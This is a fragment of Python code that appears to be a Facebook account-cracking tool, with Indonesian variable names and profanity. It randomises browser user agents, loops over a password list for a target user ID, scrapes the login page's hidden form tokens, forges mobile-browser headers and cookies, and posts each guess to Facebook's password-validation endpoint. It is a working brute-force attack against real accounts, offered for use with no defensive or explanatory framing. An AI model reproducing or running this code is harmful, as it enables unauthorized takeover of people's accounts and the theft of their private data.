...
ugen=['Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)']
##############################
keparat=[]
try:
...
for x in range(999):
	...
	TEMAN = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(111,9999))}.{str(rr(100,300))} Safari/537.36 Edg/{str(rr(10,100))}.0.{str(rr(111,9999))}.{str(rr(100,300))}"
	FUCK = f"{TEMAN}"
    ...
    def __metode__(self, cebok, user, pasw):
        ...
        try:
            for pw in pasw:
                ...
                p = session.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=246353225430376&kid_directed_site=0&app_id=246353225430376&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fclient_id%3D246353225430376%26state%3D39b3a2d02c955ad54b4b4568dfc2027b%26response_type%3Dcode%26sdk%3Dphp-sdk-5.6.2%26redirect_uri%3Dhttps%253A%252F%252Fsea-m.banggood.com%252Ffacebook.html%26scope%3Demail%252Cpublic_profile%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9ecf429e-0605-4c82-bbe1-77d526c4f24f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsea-m.banggood.com%2Ffacebook.html%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D39b3a2d02c955ad54b4b4568dfc2027b%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
                dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
                koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                koki+=' m_pixel_ratio=2.625; wd=412x756'
                heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://m.facebook.com/login/device-based/password/?uid='+user+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
                po = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,)
